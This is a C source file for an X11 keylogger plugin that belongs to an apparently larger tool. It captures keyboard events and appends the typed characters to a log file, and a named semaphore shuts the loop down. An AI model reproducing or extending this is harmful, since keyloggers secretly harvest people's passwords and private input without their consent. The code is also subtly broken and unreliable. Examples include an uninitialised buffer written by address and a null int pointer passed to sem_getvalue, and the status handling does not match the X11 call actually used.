#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <semaphore.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>

#include "../include/encrypt.h"
#include "../include/hydrogen.h"
#include "../include/types.h"
#include "../include/system_utils.h"

#define SEM "/keylog"

/**
 * Auxiliar functions
 */

int init_plugin()
{
	int flag = 0;
	char* buffer, *keysym_name;
	int* val;
	FILE* f;
	sem_t * close_sem;

	Display* dply;
	XEvent event;
	KeySym symb = NoSymbol;
	Status status;


	val = 0;

	/**
	 * Open the semaphore, for being able to turn off the keylogger
	 */

	if((close_sem = sem_open(SEM, O_CREAT, S_IRUSR | S_IWUSR, 1)) == SEM_FAILED)
	{
		DEBUG_PRINT((P_ERROR"Failed to create semaphore"));
		return ERROR;
	}
	/**
	 * Open the display
	 */

	// TODO: Check if we are getting the correct display, suposedly getting DISPLAY enviroment variable

	dply = XOpenDisplay(0);

	/**
	 * Open the file
	 */

	f = fopen("logs/temp.bin", "ab");

	if(f == NULL)
	{
		DEBUG_PRINT((P_ERROR"Failed to open temp.bin in logs/"));
		return ERROR;
	}

	while(val == 0){
		/**
		 * Get the info in bytes and dump it in a bin file
		 */

		XNextEvent(dply, &event);

		if(event.type  == KeyPress){

			// Event to check, buffer where it would be stored, max size, Gets the mod keys(shift
			// ctrl lock), if 0 does not do anything
			XLookupString(&event.xkey, &buffer, sizeof(buffer), &symb, &status);

			switch(status){
				case XLookupChars:
					fwrite(&buffer, sizeof(buffer), 1, f);
					DEBUG_PRINT((P_INFO"%s was taken from the keyboard event", buffer));
					break;
				
				case XLookupBoth:
					//TODO: Something depending on keysim
					keysym_name = XKeysymToString(symb);
					DEBUG_PRINT((P_INFO"%s was taken with %s KeySym from the keyboard event", buffer, keysym_name));
					break;
				case XLookupKeySym:
					//Do nothing, probably
					DEBUG_PRINT((P_INFO"%s Keysym was taken from keyboard event"));
					break;
				default:
					DEBUG_PRINT((P_INFO"Something weird happened on their end but could be our end"));
			}
		}
		sem_getvalue(close_sem, val);
	}

	return OK;
}

